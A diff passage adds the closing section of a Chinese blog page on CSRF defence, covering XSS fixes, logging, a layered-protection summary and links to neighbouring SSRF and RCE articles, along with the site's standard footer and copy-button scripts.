+<li>修复并防止 XSS —— CSRF 防护在存在 XSS 的站点会失效。</li>
+<li>日志与告警：记录 Token 校验失败、异常 <code>Origin</code>/<code>Referer</code> 访问。</li>
+</ol>
+<hr>
+<h2 id="五总结">五、总结</h2>
+<ul>
+<li>CSRF 是经典但依然常见的漏洞，防护需要多层次（来源校验 + Token + Cookie 策略）。</li>
+<li>不要把 <code>Referer</code> 当作唯一防线；优先使用 <code>Origin</code> 并结合 Session Token。</li>
+<li>定期渗透测试并监测 Token 校验失败日志，以发现被绕过或异常利用的可能。</li>
+</ul></section>
+
+  
+  
+  <div class="paginator">
+    
+    <a class="prev" href="http://118.178.86.67/list/base_bug/ssrf/ssrf2/">
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+      <span>SSRF 漏洞原理、挖掘与绕过</span></a>
+    
+    
+    <a class="next" href="http://118.178.86.67/list/base_bug/rce/rce/"><span>RCE：代码执行/命令执行/绕过技巧</span>
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+    </a>
+    
+  </div>
+  
+
+  
+
+
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2025 <a href="http://118.178.86.67/">Hzhsrc home</a>
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
+    </svg>
+</a>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Copied';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+    </body>
+  
+  <script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" integrity="sha512-a7JraRWUIBWcdNyeCXsGpXjtK2jHAUZqkaRKljLYUb0K8WehswASOHtMUStIrZrU0zlOBNd6441X4ZIP5O00/g==" crossorigin="anonymous" defer></script></html>
